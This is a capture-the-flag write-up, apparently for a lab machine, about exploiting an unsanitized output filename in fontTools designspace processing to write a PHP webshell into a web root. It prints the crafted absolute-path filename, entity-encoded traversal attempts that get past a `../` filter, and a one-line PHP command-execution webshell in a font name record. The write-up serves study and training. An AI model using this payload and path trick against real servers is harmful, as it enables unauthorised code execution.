# VariaType — Initial Foothold Writeup
> Lessons learned from getting tunnel-visioned on a PoC pattern
---
## The Vulnerability: CVE-2025-66034

fontTools varLib has an arbitrary file write vulnerability. When processing a `.designspace` XML file, the `<variable-font filename="...">` attribute is used directly as the output file path — no sanitization. Combined with the fact that `<labelname>` CDATA and font name records survive into the output binary, you get:

1. **Arbitrary file write** — control WHERE the file goes
2. **Content injection** — control WHAT's in the file (PHP code)

Together: write a PHP webshell to a web-accessible directory. Classic.

---

## What We Knew

- CVE-2025-66034 confirmed applicable (fonttools in vulnerable range)
- Flask app processes `.designspace` + TTF masters via fonttools
- Portal web root serves PHP (nginx + PHP-FPM)
- Font output lands in portal `/files/` directory
- Entity encoding (`&#47;`) bypasses Flask's raw-string check for `../`

We had the CVE. We had the mechanism. We had confirmed the entity bypass. We had PHP code surviving in font name records. Everything was there.

---

## Where We Got Stuck (For Hours)

Every PoC, every advisory, every reference for this CVE shows the same pattern:

```xml
<instance filename="../../../webroot/shell.php">
```

**Path traversal.** `../` sequences to climb out of the output directory and into the web root.

So that's what we did. Over and over:
- `..&#47;shell.php` (1 level) — 200 but no shell
- `..&#47;..&#47;shell.php` (2 levels) — 200 but no shell
- `..&#47;..&#47;..&#47;shell.php` (3 levels) — 302, fails
- `..&#47;..&#47;portal.variatype.htb&#47;files&#47;shell.php` — 200 but no shell
- `..&#47;..&#47;public&#47;files&#47;shell.php` — 200 but no shell

We tried dual variable-fonts. We tried instances. We tried race conditions. We installed fonttools 4.38.0 locally and discovered the Debian version doesn't even use the `<variable-font filename>` for output. We tried traversal in the upload filename. We tried PHP session poisoning.

**None of it worked.** And we kept going deeper into the same hole.

---

## The Fixation

The problem was simple: **we treated "path traversal" as the only delivery mechanism.**

The CVE description says "arbitrary file write via path traversal sequences." Every PoC uses `../`. So our mental model locked onto relative path traversal as THE way to exploit this. When `../` didn't work, we tried encoding tricks, multi-file tricks, race conditions — anything to make the traversal land.

We never stopped to ask: **what does "arbitrary file write" actually mean?**

It means you control the output path. Period. `../` is one way to express a path. An absolute path is another. The vulnerability is that `filename` is unsanitized — it's passed directly to the filesystem. That includes:

```
filename="../shell.php"          ← relative traversal (what we fixated on)
filename="/var/www/.../shell.php" ← absolute path (what actually worked)
```

---

## The Fix (What Actually Worked)

```xml
<variable-font name="TestFont-VF"
  filename="/var/www/portal.variatype.htb/public/files/shell.php">
```

No entity encoding. No traversal. Just the absolute path to the web-accessible directory.

Flask's input validation checked for `../` in the raw XML — that's what the entity bypass was about. But it never checked for absolute paths starting with `/`. Why would it? The developers were thinking about directory traversal, not arbitrary paths.

**fonttools receives the filename, calls `os.path.join(output_dir, filename)`. When `filename` starts with `/`, `os.path.join()` ignores the output_dir entirely and uses the absolute path as-is.** That's documented Python behavior. The file goes exactly where we tell it.

Combined with:
- PHP webshell in the master font's `familyName` name record: `<?php system($_GET["cmd"]); ?>`
- PHP CDATA in axis `<labelname>` as a backup injection point

Result: `http://portal.variatype.htb/files/shell.php?cmd=id` → `uid=33(www-data)`

---

## The Lesson

**When a PoC pattern isn't working, go back to what the vulnerability actually IS — not what the PoC shows you.**

The CVE gives you **unsanitized file path control**. The PoC demonstrates it with `../`. But `../` is a technique, not the vulnerability. The vulnerability is: *the application writes a file wherever you tell it to.*

Questions we should have asked earlier:
1. The CVE says "arbitrary file write" — what does "arbitrary" actually mean here?
2. If `../` is blocked or ineffective, what OTHER ways can I express a file path?
3. `os.path.join()` has specific behavior with absolute paths — does the application account for that?
4. The application checks for `../` — does it check for `/`?

We knew Flask only checked for `../`. We knew entity encoding bypassed that check. The logical next step was: **what ELSE does the check miss?** Absolute paths. It was right there.

Instead, we spent hours trying to make relative traversal work through increasingly exotic techniques — dual fonts, race conditions, PHP session injection, upload filename manipulation — all orbiting the same broken assumption.

---

## Key Takeaways

1. **PoC patterns are examples, not the exploit.** Understand the underlying primitive (unsanitized path → file write), not just the demonstrated technique (`../`).

2. **When stuck, enumerate the input space.** We had one input: a filename string. Valid values include relative paths, absolute paths, UNC paths, symlinks, special filenames. We only tried one category.

3. **`os.path.join()` with an absolute second argument ignores the first argument entirely.** This is a well-known Python behavior and a common source of path injection bugs. Should have been in our mental toolkit.

4. **Understand what the application validates — and what it doesn't.** Flask checked for `../`. It did NOT check for paths starting with `/`. That asymmetry is the exploit.

5. **Time-box your approach.** After N failed attempts with the same technique, STOP and reassess the technique itself, not just the parameters. We should have pivoted from relative traversal much sooner.

---

## Final Exploit Files

- **Designspace:** `/tmp/variatype_exploit/exploit_absolute_public.designspace`
- **Master font:** `/tmp/variatype_exploit/master_shell.ttf` (672 bytes, PHP in familyName)
- **Webshell:** `http://portal.variatype.htb/files/shell.php?cmd=COMMAND`
- **Access level:** www-data (uid=33)
